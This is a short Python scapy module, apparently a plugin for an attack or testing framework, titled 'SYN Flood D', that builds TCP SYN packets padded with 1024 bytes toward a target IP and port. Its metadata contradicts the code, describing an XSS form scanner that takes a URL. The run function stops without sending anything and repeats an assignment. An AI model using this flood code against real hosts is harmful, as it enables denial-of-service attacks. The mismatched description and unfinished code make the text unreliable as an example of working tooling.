from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
import sys
import random

service = ["any"]
args = ["ip", "port"]
RUN_DETAILS = {
    "title": "SYN Flood D",
    "Description": "Basic XSS Vulnerability detection.\n"
                   "Given a URL, grabs all HTML forms, then attempts to inject and submit harmless Javascript code "
                   "into the text and search input fields.\n"
                   "This is a general purpose XSS scanner, and will not work for all XSS-vulnerable services.",
    "services": ['http'],
    "args": ["url"],
}


def packet_build(ip, port):
    r = random.randint(1, 65535)
    pack = IP(dst=ip) / TCP(sport=r, dport=port, flags="S") / Raw(b"D" * 1024)
    return pack


def run(ip, port):
    packet = packet = packet_build(ip, port)
